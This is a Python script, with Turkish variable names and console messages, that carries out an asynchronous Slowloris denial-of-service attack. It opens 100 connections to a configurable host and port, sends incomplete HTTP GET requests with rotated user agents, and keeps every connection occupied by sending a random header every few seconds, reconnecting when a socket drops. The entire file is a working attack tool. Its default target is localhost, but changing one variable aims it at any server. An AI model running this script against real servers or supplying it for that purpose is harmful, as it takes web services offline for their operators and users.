import asyncio
import random
import socket
import sys
from urllib.parse import urlparse

hedef_giris = "http://127.0.0.1:8080/"

if hedef_giris.startswith("http://") or hedef_giris.startswith("https://"):
    parsed = urlparse(hedef_giris)
    hedef_ip = parsed.hostname or "127.0.0.1"
    hedef_port = parsed.port or (443 if hedef_giris.startswith("https://") else 80)
else:
    hedef_ip = hedef_giris
    hedef_port = 8080

baglanti_sayisi = 100

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

aktif_soket_sayisi = 0

async def slowloris_connection(connection_id):
    global aktif_soket_sayisi
    while True:
        connected = False
        try:
            reader, writer = await asyncio.open_connection(hedef_ip, hedef_port)

            sock = writer.get_extra_info('socket')
            if sock:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            writer.write(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            writer.write(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
            writer.write("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
            await writer.drain()

            connected = True
            aktif_soket_sayisi += 1
            print(f"[+] Soket {connection_id} başarıyla açıldı (Hedef: {hedef_ip}:{hedef_port}).")

            while True:
                await asyncio.sleep(random.randint(5, 10))

                header_name = f"X-{random.choice(['a', 'b', 'c', 'd', 'y', 'z'])}"
                writer.write(f"{header_name}: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                await writer.drain()

        except (asyncio.CancelledError, SystemExit):
            if connected:
                aktif_soket_sayisi -= 1
            break
        except Exception as e:
            if connected:
                aktif_soket_sayisi -= 1
            print(f"[-] Soket {connection_id} bağlantısı koptu veya açılamadı: {e}. Yeniden bağlanıyor...")
            await asyncio.sleep(1)

async def status_monitor():
    while True:
        await asyncio.sleep(5)
        print(f"[*] Canlı tutma sinyalleri gönderiliyor... Aktif Soket Sayısı: {aktif_soket_sayisi}")

async def main():
    print(f"[*] {hedef_ip}:{hedef_port} adresine {baglanti_sayisi} adet yavaş bağlantı açılıyor (Asenkron Slowloris)...")

    monitor_task = asyncio.create_task(status_monitor())

    tasks = []
    for i in range(baglanti_sayisi):
        tasks.append(asyncio.create_task(slowloris_connection(i + 1)))

        await asyncio.sleep(0.02)

    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        pass
    finally:
        monitor_task.cancel()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Program kullanıcı tarafından durduruldu.")
